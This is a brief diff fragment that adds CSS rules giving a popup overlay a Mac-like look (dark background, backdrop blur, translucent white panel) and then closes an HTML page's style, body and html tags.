+      .mac-style #popupOverlay .bg-blue-700 {
+        background: #333333 !important;
+      }
+
+      .mac-style #popupOverlay {
+        backdrop-filter: blur(10px);
+      }
+
+      .mac-style #popupOverlay .bg-white {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(5px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+      }
+    </style>
+  </body>
+</html>
